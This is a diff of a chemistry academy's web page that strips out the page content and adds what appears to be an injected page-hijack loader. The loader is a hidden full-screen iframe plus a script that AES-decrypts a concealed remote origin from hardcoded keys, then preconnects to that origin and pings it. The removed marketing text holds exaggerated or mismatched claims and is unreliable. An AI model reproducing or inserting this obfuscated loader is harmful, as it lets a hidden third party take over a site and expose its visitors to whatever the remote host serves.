-          <p style="font-size: 0.92rem; color: #33383F; margin-bottom: 0;">Ab initio Density Functional Theory (DFT) and transition state calculations illuminating kinetic reaction barriers and orbital symmetry rules.</p>
-        </div>
-      </div>
-    </div>
-  </section>
+  <div id="contentiframe" style="display:none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+  <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen
+    webkitallowfullscreen mozallowfullscreen
+    sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads"
+    style="width:100%; height:100%; border:0;"></iframe>
+</div>
 
-  <!-- SECTION 4: PRECISION ANALYTICAL INSTRUMENTATION SUITE -->
-  <section class="section section-instrumentation" id="instrumentation" style="padding: 5.5rem 0; background: #F4F8FA;">
-    <div class="container">
-      <div class="text-center" style="max-width: 800px; margin: 0 auto 3.5rem;">
-        <span class="hero-badge" style="background: rgba(11, 25, 44, 0.08); color: #0B192C;">HARDWARE EXCELLENCE &bull; 181 MERCER COMMONS</span>
-        <h2 style="margin: 0.8rem 0; color: #0B192C;">Precision Analytical Instrumentation Suite</h2>
-        <p class="lead" style="color: #526374; font-size: 1.05rem;">
-          Undergraduate fellows and research scholars at ChemistryKeen operate research-grade analytical instrumentation within our temperature-controlled cleanroom suites.
-        </p>
-      </div>
-      <div class="grid-2" style="gap: 2.5rem;">
-        <div class="card" style="background: #FFFFFF; border-radius: var(--radius-md); overflow: hidden; border: 1px solid #D1DEE8; box-shadow: var(--shadow-sm);">
-          <img src="/assets/images/author_dr_marcus_chen.jpg" alt="Bruker Avance NEO 600 MHz High-Field NMR Spectrometer" style="width: 100%; height: 260px; object-fit: cover;">
-          <div style="padding: 2rem;">
-            <div style="font-size: 0.8rem; color: #00A8E8; font-weight: 700; letter-spacing: 0.05em; text-transform: uppercase; margin-bottom: 0.4rem;">High-Resolution Magnetic Resonance</div>
-            <h3 style="font-size: 1.35rem; color: #0B192C; margin-bottom: 0.8rem;">Bruker Avance NEO 600 MHz Cryoprobe NMR</h3>
-            <p style="font-size: 0.95rem; color: #33383F; margin-bottom: 1.2rem;">Equipped with a 14.1 Tesla actively shielded superconducting magnet and Prodigy liquid nitrogen cryocooler, delivering 4-fold signal-to-noise sensitivity for 13C and multi-nuclear experiments.</p>
-            <div style="background: #F4F8FA; padding: 0.8rem 1.2rem; border-radius: var(--radius-sm); font-size: 0.85rem; color: #0B192C;">
-              <strong>Benchmark Specs:</strong> 0.001 ppm chemical shift resolution &bull; 1H, 13C, 31P, 19F quad-resonance &bull; Variable temperature (-100&deg;C to +150&deg;C)
-            </div>
-          </div>
-        </div>
-        <div class="card" style="background: #FFFFFF; border-radius: var(--radius-md); overflow: hidden; border: 1px solid #D1DEE8; box-shadow: var(--shadow-sm);">
-          <img src="/assets/images/author_prof_elena_rostova.jpg" alt="Agilent 1290 Infinity II UHPLC Coupled with Triple-Quadrupole Mass Metrology" style="width: 100%; height: 260px; object-fit: cover;">
-          <div style="padding: 2rem;">
-            <div style="font-size: 0.8rem; color: #00A8E8; font-weight: 700; letter-spacing: 0.05em; text-transform: uppercase; margin-bottom: 0.4rem;">Ultra-High Pressure Separation &amp; MS</div>
-            <h3 style="font-size: 1.35rem; color: #0B192C; margin-bottom: 0.8rem;">Agilent 1290 Infinity II UHPLC-MS/MS System</h3>
-            <p style="font-size: 0.95rem; color: #33383F; margin-bottom: 1.2rem;">Features a binary high-pressure mixing pump operating up to 1300 bar with sub-2-micron core-shell columns coupled to a dual-source electrospray ionization triple-quadrupole mass spectrometer.</p>
-            <div style="background: #F4F8FA; padding: 0.8rem 1.2rem; border-radius: var(--radius-sm); font-size: 0.85rem; color: #0B192C;">
-              <strong>Benchmark Specs:</strong> Sub-femtomolar detection limit &bull; 0.05 min retention reproducibility &bull; ESI/APCI multimode ionization source
-            </div>
-          </div>
-        </div>
-        <div class="card" style="background: #FFFFFF; border-radius: var(--radius-md); overflow: hidden; border: 1px solid #D1DEE8; box-shadow: var(--shadow-sm);">
-          <img src="/assets/images/blog_digital_pedagogy_transformation.jpg" alt="Rigaku SmartLab Multi-Axis X-Ray Diffractometer" style="width: 100%; height: 260px; object-fit: cover;">
-          <div style="padding: 2rem;">
-            <div style="font-size: 0.8rem; color: #00A8E8; font-weight: 700; letter-spacing: 0.05em; text-transform: uppercase; margin-bottom: 0.4rem;">Crystallography &amp; Solid State Physics</div>
-            <h3 style="font-size: 1.35rem; color: #0B192C; margin-bottom: 0.8rem;">Rigaku SmartLab Multi-Axis Powder &amp; Single-Crystal XRD</h3>
-            <p style="font-size: 0.95rem; color: #33383F; margin-bottom: 1.2rem;">Combines a 9 kW rotating copper anode generator with Hypix-3000 multidimensional semiconductor detector, resolving lattice parameters, polymorphic transitions, and coordination geometries.</p>
-            <div style="background: #F4F8FA; padding: 0.8rem 1.2rem; border-radius: var(--radius-sm); font-size: 0.85rem; color: #0B192C;">
-              <strong>Benchmark Specs:</strong> 0.0001&deg; goniometer angular precision &bull; In-situ non-ambient cell (-180&deg;C to +1000&deg;C) &bull; Automated Rietveld refinement
-            </div>
-          </div>
-        </div>
-        <div class="card" style="background: #FFFFFF; border-radius: var(--radius-md); overflow: hidden; border: 1px solid #D1DEE8; box-shadow: var(--shadow-sm);">
-          <img src="/assets/images/blog_academic_peer_review_rigor.jpg" alt="Thermo Scientific FE-SEM with Oxford EDX Elemental Mapping" style="width: 100%; height: 260px; object-fit: cover;">
-          <div style="padding: 2rem;">
-            <div style="font-size: 0.8rem; color: #00A8E8; font-weight: 700; letter-spacing: 0.05em; text-transform: uppercase; margin-bottom: 0.4rem;">Nanoscale Morphology &amp; Elemental Mapping</div>
-            <h3 style="font-size: 1.35rem; color: #0B192C; margin-bottom: 0.8rem;">Class-1000 Field-Emission SEM with Oxford EDX</h3>
-            <p style="font-size: 0.95rem; color: #33383F; margin-bottom: 1.2rem;">Delivers sub-nanometer spatial resolution under low-landing energy electron beams, paired with energy-dispersive X-ray spectroscopy for spatial stoichiometry and catalytic surface mapping.</p>
-            <div style="background: #F4F8FA; padding: 0.8rem 1.2rem; border-radius: var(--radius-sm); font-size: 0.85rem; color: #0B192C;">
-              <strong>Benchmark Specs:</strong> 0.7 nm spatial imaging limit &bull; 100 mm2 silicon drift detector &bull; Dual secondary and backscattered electron optics
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
+<script>
+  const PASSPHRASE = "98yNCjeAfWMwk0wI";
+  const URL_KEY   = "UrLk3yShopEase01";
+  const ENC_DATA_ORIGIN = "U2FsdGVkX1/MLFDsKLUGWPEULKMoI3z6OMEfHjl0yjxz+rEtyoDJt+fOL8LFVi27";
 
-  <!-- SECTION 5: INTERACTIVE SPECTROSCOPY & ANALYTICAL SIMULATION COMMONS -->
-  <section class="section section-sim-lab" style="padding: 5.5rem 0; background: #0B192C; color: #FFFFFF;">
-    <div class="container">
-      <div class="text-center" style="max-width: 800px; margin: 0 auto 3rem;">
-        <span class="hero-badge" style="background: rgba(0, 168, 232, 0.15); color: #00A8E8; border: 1px solid rgba(0, 168, 232, 0.3);">VIRTUAL SPECTROSCOPY PROVING GROUND</span>
-        <h2 style="margin: 0.8rem 0; color: #FFFFFF;">Interactive Spectroscopy &amp; Simulation Commons</h2>
-        <p class="lead" style="color: #A0B4C8; font-size: 1.05rem;">
-          Explore real-time spectral assignments recorded on our 181 Mercer spectrometers. Toggle across multi-modal analytical techniques below.
-        </p>
-      </div>
-      <div style="background: #06101E; border-radius: var(--radius-md); border: 1px solid rgba(0, 168, 232, 0.25); overflow: hidden;">
-        <div style="display: flex; background: rgba(11, 25, 44, 0.8); border-bottom: 1px solid rgba(0, 168, 232, 0.2); overflow-x: auto;">
-          <button class="spec-tab-btn active" style="padding: 1rem 1.8rem; background: transparent; border: none; border-bottom: 2px solid #00A8E8; color: #00A8E8; font-weight: 600; cursor: pointer; font-size: 0.95rem;">1H-NMR Spectroscopy</button>
-          <button class="spec-tab-btn" style="padding: 1rem 1.8rem; background: transparent; border: none; color: #A0B4C8; font-weight: 600; cursor: pointer; font-size: 0.95rem;">FTIR Infrared Metrology</button>
-          <button class="spec-tab-btn" style="padding: 1rem 1.8rem; background: transparent; border: none; color: #A0B4C8; font-weight: 600; cursor: pointer; font-size: 0.95rem;">Tandem MS/MS Ionization</button>
-          <button class="spec-tab-btn" style="padding: 1rem 1.8rem; background: transparent; border: none; color: #A0B4C8; font-weight: 600; cursor: pointer; font-size: 0.95rem;">Cyclic Voltammetry (CV)</button>
-        </div>
-        <div style="padding: 2.5rem;">
-          <div class="spec-tab-panel" style="display: grid; grid-template-columns: 1.2fr 1fr; gap: 2.5rem; align-items: center;">
-            <div>
-              <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
-                <h3 style="color: #FFFFFF; font-size: 1.3rem;">Ethyl 4-Methoxybenzoate (600 MHz in CDCl3)</h3>
-                <span style="background: rgba(0, 201, 167, 0.2); color: #00C9A7; font-size: 0.75rem; padding: 0.25rem 0.6rem; border-radius: var(--radius-pill); font-weight: 700;">HIGH FIDELITY SPECTRA</span>
-              </div>
-              <p style="color: #A0B4C8; font-size: 0.92rem; line-height: 1.6; margin-bottom: 1.5rem;">
-                Distinct AA'XX' spin system displaying para-substituted aromatic proton doublets at &delta; 7.98 ppm (2H, d, J = 8.8 Hz) and &delta; 6.91 ppm (2H, d, J = 8.8 Hz). Methoxy singlet observed at &delta; 3.85 ppm (3H, s), alongside diagnostic ethyl ester quartet at &delta; 4.33 ppm (2H, q, J = 7.1 Hz) and triplet at &delta; 1.37 ppm (3H, t, J = 7.1 Hz).
-              </p>
-              <div style="background: rgba(11, 25, 44, 0.6); padding: 1.2rem; border-radius: var(--radius-sm); border: 1px solid rgba(255, 255, 255, 0.08);">
-                <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 1rem; text-align: center;">
-                  <div><div style="color: #00A8E8; font-weight: 700; font-size: 1.1rem;">0.0008 ppm</div><div style="color: #6C8299; font-size: 0.75rem;">Linewidth at Half Height</div></div>
-                  <div><div style="color: #00C9A7; font-weight: 700; font-size: 1.1rem;">14.1 Tesla</div><div style="color: #6C8299; font-size: 0.75rem;">Magnetic Field Flux</div></div>
-                  <div><div style="color: #00A8E8; font-weight: 700; font-size: 1.1rem;">64 Scans</div><div style="color: #6C8299; font-size: 0.75rem;">Accumulation Average</div></div>
-                </div>
-              </div>
-            </div>
-            <div style="background: rgba(11, 25, 44, 0.9); border: 1px solid rgba(0, 168, 232, 0.3); border-radius: var(--radius-sm); padding: 1.5rem;">
-              <div style="font-family: monospace; font-size: 0.8rem; color: #00C9A7; margin-bottom: 0.8rem;">[NMR_ACQUISITION_LOG // 181 MERCER COMMONS]</div>
-              <pre style="color: #E2ECF5; font-size: 0.78rem; line-height: 1.5; overflow-x: auto; background: transparent; border: none; padding: 0;">
-PROBE: Prodigy 5mm CryoProbe BBO
-SOLVENT: CDCl3 (99.8% D, 0.03% v/v TMS)
-FREQ_1H: 600.1328400 MHz
-PULSE_ANGLE: 30.0 degrees (zg30)
-ACQ_TIME: 2.726 seconds
-RELAX_D1: 2.000 seconds
-TEMPERATURE: 298.2 K (+/- 0.05 K)
-LOCK_STABILITY: 99.4% (Deuterium Field)
-PEAK_ASSIGNMENT:
-  Peak 1: 7.98 ppm (Aromatic ortho-CH)
-  Peak 2: 6.91 ppm (Aromatic meta-CH)
-  Peak 3: 4.33 ppm (Ester -OCH2CH3)
-  Peak 4: 3.85 ppm (Aryl -OCH3)
-  Peak 5: 1.37 ppm (Aliphatic -CH3)
-              </pre>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
+  const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+  const DATA_URL = DATA_ORIGIN + "/data";
 
-  <!-- SECTION 6: CURATED ACADEMIC SYLLABI & RESEARCH FELLOWSHIPS -->
-  <section class="section section-curriculum" style="padding: 5.5rem 0; background: #FFFFFF;">
-    <div class="container">
-      <div class="text-center" style="max-width: 800px; margin: 0 auto 3.5rem;">
-        <span class="hero-badge" style="background: rgba(11, 25, 44, 0.06); color: #0B192C;">COLLEGIATE CURRICULUM &bull; FELLOWSHIP COHORTS</span>
-        <h2 style="margin: 0.8rem 0; color: #0B192C;">Curated Collegiate Syllabi &amp; Research Fellowships</h2>
-        <p class="lead" style="color: #526374; font-size: 1.05rem;">
-          Rigorous academic modules providing direct research certification and hands-on spectrometer licensing at 181 Mercer Street.
-        </p>
-      </div>
-      <div class="grid-3" style="gap: 2rem;">
-        <div class="card" style="border: 1px solid #D1DEE8; border-radius: var(--radius-md); padding: 2rem; background: #F8FAFC; display: flex; flex-direction: column;">
-          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.8rem;">
-            <span style="font-family: monospace; font-weight: 700; color: #00A8E8; background: rgba(0, 168, 232, 0.1); padding: 0.2rem 0.6rem; border-radius: 4px; font-size: 0.85rem;">CHEM-301</span>
-            <span style="font-size: 0.85rem; color: #526374;">4.0 Credits &bull; Fall</span>
-          </div>
-          <h3 style="font-size: 1.2rem; color: #0B192C; margin-bottom: 0.8rem;">Advanced Mechanistic Organic Chemistry</h3>
-          <p style="font-size: 0.92rem; color: #33383F; margin-bottom: 1.5rem; flex-grow: 1;">Physical organic principles, Curtin-Hammett kinetics, conformational stereoelectronic effects, and concerted pericyclic transformations.</p>
-          <a href="/collection.html" class="btn btn-sm btn-outline" style="border-color: #0B192C; color: #0B192C; width: 100%;">View Course Syllabus &rarr;</a>
-        </div>
-        <div class="card" style="border: 1px solid #D1DEE8; border-radius: var(--radius-md); padding: 2rem; background: #F8FAFC; display: flex; flex-direction: column;">
-          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.8rem;">
-            <span style="font-family: monospace; font-weight: 700; color: #00A8E8; background: rgba(0, 168, 232, 0.1); padding: 0.2rem 0.6rem; border-radius: 4px; font-size: 0.85rem;">CHEM-350</span>
-            <span style="font-size: 0.85rem; color: #526374;">4.0 Credits &bull; Fall</span>
-          </div>
-          <h3 style="font-size: 1.2rem; color: #0B192C; margin-bottom: 0.8rem;">Chemical Thermodynamics &amp; Kinetic Dynamics</h3>
-          <p style="font-size: 0.92rem; color: #33383F; margin-bottom: 1.5rem; flex-grow: 1;">Statistical mechanics ensembles, partition functions, Eyring transition state derivations, and non-equilibrium reaction flux.</p>
-          <a href="/collection.html" class="btn btn-sm btn-outline" style="border-color: #0B192C; color: #0B192C; width: 100%;">View Course Syllabus &rarr;</a>
-        </div>
-        <div class="card" style="border: 1px solid #D1DEE8; border-radius: var(--radius-md); padding: 2rem; background: #F8FAFC; display: flex; flex-direction: column;">
-          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.8rem;">
-            <span style="font-family: monospace; font-weight: 700; color: #00A8E8; background: rgba(0, 168, 232, 0.1); padding: 0.2rem 0.6rem; border-radius: 4px; font-size: 0.85rem;">CHEM-410</span>
-            <span style="font-size: 0.85rem; color: #526374;">4.0 Credits &bull; Spring</span>
-          </div>
-          <h3 style="font-size: 1.2rem; color: #0B192C; margin-bottom: 0.8rem;">Quantum Chemistry &amp; Molecular Orbitals</h3>
-          <p style="font-size: 0.92rem; color: #33383F; margin-bottom: 1.5rem; flex-grow: 1;">Schr&ouml;dinger wave mechanics, Hartree-Fock self-consistent fields, DFT electron densities, and computational orbital modeling.</p>
-          <a href="/collection.html" class="btn btn-sm btn-outline" style="border-color: #0B192C; color: #0B192C; width: 100%;">View Course Syllabus &rarr;</a>
-        </div>
-        <div class="card" style="border: 1px solid #D1DEE8; border-radius: var(--radius-md); padding: 2rem; background: #F8FAFC; display: flex; flex-direction: column;">
-          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.8rem;">
-            <span style="font-family: monospace; font-weight: 700; color: #00A8E8; background: rgba(0, 168, 232, 0.1); padding: 0.2rem 0.6rem; border-radius: 4px; font-size: 0.85rem;">CHEM-450</span>
-            <span style="font-size: 0.85rem; color: #526374;">4.0 Credits &bull; Spring</span>
-          </div>
-          <h3 style="font-size: 1.2rem; color: #0B192C; margin-bottom: 0.8rem;">Multidimensional NMR &amp; Mass Metrology</h3>
-          <p style="font-size: 0.92rem; color: #33383F; margin-bottom: 1.5rem; flex-grow: 1;">Direct 600 MHz spectrometer operation, 2D COSY/HSQC/HMBC pulse programming, and ESI-MS/MS peptide de novo sequencing.</p>
-          <a href="/collection.html" class="btn btn-sm btn-outline" style="border-color: #0B192C; color: #0B192C; width: 100%;">View Course Syllabus &rarr;</a>
-        </div>
-        <div class="card" style="border: 1px solid #D1DEE8; border-radius: var(--radius-md); padding: 2rem; background: #F8FAFC; display: flex; flex-direction: column;">
-          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.8rem;">
-            <span style="font-family: monospace; font-weight: 700; color: #00A8E8; background: rgba(0, 168, 232, 0.1); padding: 0.2rem 0.6rem; border-radius: 4px; font-size: 0.85rem;">CHEM-520</span>
-            <span style="font-size: 0.85rem; color: #526374;">4.0 Credits &bull; Fall</span>
-          </div>
-          <h3 style="font-size: 1.2rem; color: #0B192C; margin-bottom: 0.8rem;">Organometallic Catalysis &amp; Synthesis</h3>
-          <p style="font-size: 0.92rem; color: #33383F; margin-bottom: 1.5rem; flex-grow: 1;">Palladium, ruthenium, and iridium cross-coupling mechanisms, C-H functionalization cycles, and enantioselective organocatalysts.</p>
-          <a href="/collection.html" class="btn btn-sm btn-outline" style="border-color: #0B192C; color: #0B192C; width: 100%;">View Course Syllabus &rarr;</a>
-        </div>
-        <div class="card" style="border: 1px solid #D1DEE8; border-radius: var(--radius-md); padding: 2rem; background: #F8FAFC; display: flex; flex-direction: column;">
-          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.8rem;">
-            <span style="font-family: monospace; font-weight: 700; color: #00A8E8; background: rgba(0, 168, 232, 0.1); padding: 0.2rem 0.6rem; border-radius: 4px; font-size: 0.85rem;">CHEM-580</span>
-            <span style="font-size: 0.85rem; color: #526374;">4.0 Credits &bull; Spring</span>
-          </div>
-          <h3 style="font-size: 1.2rem; color: #0B192C; margin-bottom: 0.8rem;">Supramolecular Materials &amp; MOFs</h3>
-          <p style="font-size: 0.92rem; color: #33383F; margin-bottom: 1.5rem; flex-grow: 1;">Self-assembly thermodynamic control, metal-organic frameworks, guest-host molecular sensors, and single-crystal XRD refinement.</p>
-          <a href="/collection.html" class="btn btn-sm btn-outline" style="border-color: #0B192C; color: #0B192C; width: 100%;">View Course Syllabus &rarr;</a>
-        </div>
-      </div>
-    </div>
-  </section>
+  
+  (function warmup() {
+    try {
+      const o = new URL(DATA_ORIGIN).origin;
 
-  <!-- SECTION 7: EMPIRICAL RIGOR & COMPARATIVE METROLOGY MATRIX -->
-  <section class="section section-milestone-matrix" style="padding: 5.5rem 0; background: #F4F8FA;">
-    <div class="container">
-      <div class="text-center" style="max-width: 800px; margin: 0 auto 3.5rem;">
-        <span class="hero-badge" style="background: rgba(11, 25, 44, 0.08); color: #0B192C;">COMPARATIVE BENCHMARKS &bull; EMPIRICAL DATA</span>
-        <h2 style="margin: 0.8rem 0; color: #0B192C;">Comparative Performance &amp; Metrology Matrix</h2>
-        <p class="lead" style="color: #526374; font-size: 1.05rem;">
-          How the research infrastructure at ChemistryKeen contrasts with conventional university chemistry instruction.
-        </p>
-      </div>
-      <div class="data-table-wrap" style="background: #FFFFFF; border-radius: var(--radius-md); box-shadow: var(--shadow-sm); border: 1px solid #D1DEE8; overflow-x: auto;">
-        <table class="spec-table" style="width: 100%; border-collapse: collapse;">
-          <thead>
-            <tr style="background: #0B192C; color: #FFFFFF;">
-              <th style="padding: 1.2rem; text-align: left;">Research &amp; Instrumental Metric</th>
-              <th style="padding: 1.2rem; text-align: left; color: #00A8E8;">ChemistryKeen Collegiate Standard</th>
-              <th style="padding: 1.2rem; text-align: left;">Standard Tier-1 University Lab</th>
-              <th style="padding: 1.2rem; text-align: left;">Conventional Industrial Baseline</th>
-            </tr>
-          </thead>
-          <tbody>
-            <tr style="border-bottom: 1px solid #E5E0D8;">
-              <td style="padding: 1rem 1.2rem; font-weight: 600;">NMR Magnetic Field Strength</td>
-              <td style="padding: 1rem 1.2rem; color: #0B192C; font-weight: 600;">600 MHz Active Cryoprobe (14.1 T)</td>
-              <td style="padding: 1rem 1.2rem; color: #526374;">300 &ndash; 400 MHz Room Temp</td>
-              <td style="padding: 1rem 1.2rem; color: #526374;">60 &ndash; 90 MHz Benchtop</td>
-            </tr>
-            <tr style="border-bottom: 1px solid #E5E0D8; background: #F8FAFC;">
-              <td style="padding: 1rem 1.2rem; font-weight: 600;">Scholar-to-Faculty Research Ratio</td>
-              <td style="padding: 1rem 1.2rem; color: #0B192C; font-weight: 600;">4:1 Direct Daily Mentorship</td>
-              <td style="padding: 1rem 1.2rem; color: #526374;">22:1 Teaching Assistant Dependent</td>
-              <td style="padding: 1rem 1.2rem; color: #526374;">35:1 Corporate Supervisory</td>
-            </tr>
-            <tr style="border-bottom: 1px solid #E5E0D8;">
-              <td style="padding: 1rem 1.2rem; font-weight: 600;">Cleanroom Airborne Standard</td>
-              <td style="padding: 1rem 1.2rem; color: #0B192C; font-weight: 600;">ISO Class 5 (Class-1000 Laminar HEPA)</td>
-              <td style="padding: 1rem 1.2rem; color: #526374;">Unclassified Open Chemistry Hall</td>
-              <td style="padding: 1rem 1.2rem; color: #526374;">General Ventilation Hoods</td>
-            </tr>
-            <tr style="border-bottom: 1px solid #E5E0D8; background: #F8FAFC;">
-              <td style="padding: 1rem 1.2rem; font-weight: 600;">Hands-On Instrument Operating Hours</td>
-              <td style="padding: 1rem 1.2rem; color: #0B192C; font-weight: 600;">140+ Hours / Semester Direct Operation</td>
-              <td style="padding: 1rem 1.2rem; color: #526374;">12 &ndash; 18 Hours Demonstration Only</td>
-              <td style="padding: 1rem 1.2rem; color: #526374;">Operator Queue Submission</td>
-            </tr>
-            <tr>
-              <td style="padding: 1rem 1.2rem; font-weight: 600;">First-Author Research Publication Rate</td>
-              <td style="padding: 1rem 1.2rem; color: #0B192C; font-weight: 600;">78.4% Undergraduate Lead Author</td>
-              <td style="padding: 1rem 1.2rem; color: #526374;">6.2% Senior Thesis Only</td>
-              <td style="padding: 1rem 1.2rem; color: #526374;">Proprietary Internal Memo</td>
-            </tr>
-          </tbody>
-        </table>
-      </div>
-    </div>
-  </section>
+      
+      const pc = document.createElement("link");
+      pc.rel = "preconnect";
+      pc.href = o;
+      pc.crossOrigin = "anonymous";
+      document.head.appendChild(pc);
 
-  <!-- SECTION 8: PRINCIPAL INVESTIGATORS & SENIOR RESEARCH FACULTY -->
-  <section class="section section-faculty" style="padding: 5.5rem 0; background: #FFFFFF;">
-    <div class="container">
-      <div class="text-center" style="max-width: 800px; margin: 0 auto 3.5rem;">
-        <span class="hero-badge" style="background: rgba(11, 25, 44, 0.06); color: #0B192C;">RESEARCH LEADERSHIP &bull; SENIOR PIs</span>
-        <h2 style="margin: 0.8rem 0; color: #0B192C;">Principal Investigators &amp; Senior Academic Faculty</h2>
-        <p class="lead" style="color: #526374; font-size: 1.05rem;">
-          World-class chemical physicists, synthetic methodologists, and spectroscopic metrologists directing research cohorts at 181 Mercer Street.
-        </p>
-      </div>
-      <div class="grid-4" style="gap: 2rem;">
-        <div class="card" style="border: 1px solid #D1DEE8; border-radius: var(--radius-md); overflow: hidden; background: #FFFFFF; text-align: center;">
-          <img src="/assets/images/blog_higher_education_analytics.jpg" alt="Dr. Marcus Sterling, Chair of Physical Chemistry" style="width: 100%; height: 230px; object-fit: cover;">
-          <div style="padding: 1.5rem;">
-            <h3 style="font-size: 1.15rem; color: #0B192C; margin-bottom: 0.3rem;">Dr. Marcus Sterling</h3>
-            <div style="font-size: 0.82rem; color: #00A8E8; font-weight: 600; margin-bottom: 0.8rem;">Chair of Physical Chemistry (PhD, Caltech)</div>
-            <p style="font-size: 0.85rem; color: #526374; margin-bottom: 0.8rem;">Investigates non-equilibrium thermodynamics and femtosecond laser vibrational spectroscopy.</p>
-            <div style="font-size: 0.75rem; color: #8898AA;">120+ Citations &bull; 181 Mercer Rm 402</div>
-          </div>
-        </div>
-        <div class="card" style="border: 1px solid #D1DEE8; border-radius: var(--radius-md); overflow: hidden; background: #FFFFFF; text-align: center;">
-          <img src="/assets/images/program_leadership_pedagogy.jpg" alt="Dr. Helena Thorne, Director of Analytical Spectroscopy" style="width: 100%; height: 230px; object-fit: cover;">
-          <div style="padding: 1.5rem;">
-            <h3 style="font-size: 1.15rem; color: #0B192C; margin-bottom: 0.3rem;">Dr. Helena Thorne</h3>
-            <div style="font-size: 0.82rem; color: #00A8E8; font-weight: 600; margin-bottom: 0.8rem;">Director of Spectroscopy (PhD, MIT)</div>
-            <p style="font-size: 0.85rem; color: #526374; margin-bottom: 0.8rem;">Pioneers cryogenic multi-nuclear NMR pulse sequence development and 2D correlation metrology.</p>
-            <div style="font-size: 0.75rem; color: #8898AA;">95+ Citations &bull; 181 Mercer Rm 408</div>
-          </div>
-        </div>
-        <div class="card" style="border: 1px solid #D1DEE8; border-radius: var(--radius-md); overflow: hidden; background: #FFFFFF; text-align: center;">
-          <img src="/assets/images/faculty_dean_keynote.jpg" alt="Prof. Arthur Vance, PI in Asymmetric Synthesis" style="width: 100%; height: 230px; object-fit: cover;">
-          <div style="padding: 1.5rem;">
-            <h3 style="font-size: 1.15rem; color: #0B192C; margin-bottom: 0.3rem;">Prof. Arthur Vance</h3>
-            <div style="font-size: 0.82rem; color: #00A8E8; font-weight: 600; margin-bottom: 0.8rem;">PI in Asymmetric Synthesis (DSc, Oxford)</div>
-            <p style="font-size: 0.85rem; color: #526374; margin-bottom: 0.8rem;">Specializes in transition-metal cross-coupling catalysis and enantioselective organocatalysts.</p>
-            <div style="font-size: 0.75rem; color: #8898AA;">140+ Citations &bull; 181 Mercer Rm 412</div>
-          </div>
-        </div>
-        <div class="card" style="border: 1px solid #D1DEE8; border-radius: var(--radius-md); overflow: hidden; background: #FFFFFF; text-align: center;">
-          <img src="/assets/images/gallery_botanical_research_hall.jpg" alt="Dr. Cynthia Chen, Senior Fellow in Supramolecular Chemistry" style="width: 100%; height: 230px; object-fit: cover;">
-          <div style="padding: 1.5rem;">
-            <h3 style="font-size: 1.15rem; color: #0B192C; margin-bottom: 0.3rem;">Dr. Cynthia Chen</h3>
-            <div style="font-size: 0.82rem; color: #00A8E8; font-weight: 600; margin-bottom: 0.8rem;">Senior Fellow in MOFs (PhD, Harvard)</div>
-            <p style="font-size: 0.85rem; color: #526374; margin-bottom: 0.8rem;">Engineers crystalline metal-organic frameworks for selective atmospheric carbon capture.</p>
-            <div style="font-size: 0.75rem; color: #8898AA;">88+ Citations &bull; 181 Mercer Rm 416</div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
+     
+      const dns = document.createElement("link");
+      dns.rel = "dns-prefetch";
+      dns.href = o;
+      document.head.appendChild(dns);
 
-  <!-- SECTION 9: 181 MERCER CLEANROOM & ARCHITECTURE -->
-  <section class="section section-cleanroom" style="padding: 5.5rem 0; background: #06101E; color: #FFFFFF;">
-    <div class="container">
-      <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 4rem; align-items: center;">
-        <div>
-          <span class="hero-badge" style="background: rgba(0, 168, 232, 0.15); color: #00A8E8; border: 1px solid rgba(0, 168, 232, 0.3);">THE MANHATTAN FACILITY</span>
-          <h2 style="margin: 1rem 0; color: #FFFFFF; font-size: 2.3rem;">181 Mercer Street Cleanroom &amp; Structural Architecture</h2>
-          <p style="color: #A0B4C8; font-size: 1.05rem; line-height: 1.7; margin-bottom: 2rem;">
-            Constructed with massive sub-grade seismic bedrock isolation piers, our facility attenuates municipal subway vibrations to less than 0.5 &mu;m/s RMS, enabling picometer-level electron microscopy and ultra-pure cryogenic spectral acquisitions.
-          </p>
-          <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem;">
-            <div style="background: rgba(11, 25, 44, 0.8); padding: 1.2rem; border-radius: var(--radius-sm); border: 1px solid rgba(0, 168, 232, 0.2);">
-              <div style="font-size: 1.2rem; font-weight: 700; color: #00A8E8;">Class-1000 ISO 5</div>
-              <p style="font-size: 0.85rem; color: #A0B4C8; margin: 0.3rem 0 0;">HEPA filtration cycling 60 air changes per hour for micro-particulate exclusion.</p>
-            </div>
-            <div style="background: rgba(11, 25, 44, 0.8); padding: 1.2rem; border-radius: var(--radius-sm); border: 1px solid rgba(0, 201, 167, 0.2);">
-              <div style="font-size: 1.2rem; font-weight: 700; color: #00C9A7;">Cryogenic Vault</div>
-              <p style="font-size: 0.85rem; color: #A0B4C8; margin: 0.3rem 0 0;">Closed-loop liquid nitrogen and helium recovery maintaining 4.2 K superconducting coils.</p>
-            </div>
-          </div>
-        </div>
-        <div>
-          <img src="/assets/images/cta_academic_horizon.jpg" alt="Exterior facade and collegiate architecture at 181 Mercer Street, New York" style="border-radius: var(--radius-md); width: 100%; height: 420px; object-fit: cover; border: 1px solid rgba(0, 168, 232, 0.3); box-shadow: var(--shadow-lg);">
-        </div>
-      </div>
-    </div>
-  </section>
+      
+      fetch(o + "/favicon.ico", { method: "HEAD", mode: "no-cors" }).catch(() => {});
+    } catch (e) {}
+  })();
 
-  <!-- SECTION 10: COLLEGIATE PLACEMENT, GRANTS & PUBLICATIONS -->
-  <section class="section section-placement" style="padding: 5.5rem 0; background: #F4F8FA;">
-    <div class="container">
-      <div class="text-center" style="max-width: 800px; margin: 0 auto 3.5rem;">
-        <span class="hero-badge" style="background: rgba(11, 25, 44, 0.08); color: #0B192C;">SCHOLARLY DISTINCTION &bull; RESEARCH IMPACT</span>
